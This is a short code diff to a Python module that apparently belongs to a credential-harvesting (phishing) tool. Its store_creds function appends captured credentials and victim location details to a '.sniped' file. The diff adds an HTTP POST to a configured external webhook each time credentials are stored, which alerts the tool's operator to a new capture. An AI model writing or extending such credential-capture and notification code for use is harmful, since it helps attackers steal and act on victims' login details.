@@ -2,6 +2,10 @@ import random
 import string
 import uuid
 
+import requests
+
+from config import WEBHOOKS, WEBHOOK_URL, WEBHOOK_PAYLOAD
+
 
 def generate_token(size=32):
     return ''.join(random.SystemRandom().choice(
@@ -21,6 +25,10 @@ def store_creds(
     region,
     zip_code
 ):
+
+    if WEBHOOKS:
+        req = requests.post(WEBHOOK_URL, json=WEBHOOK_PAYLOAD)
+
     try:
         with open('.sniped','a') as fh:
             cred_id = str(uuid.uuid4())
@@ -68,7 +76,7 @@ def reload_creds(seen):
                     city = cl[7]
                     region = cl[8]
                     zip_code = cl[9]
-                    
+
                     add_cred = {
                         'cred_id': cred_id,
                         'module': module,
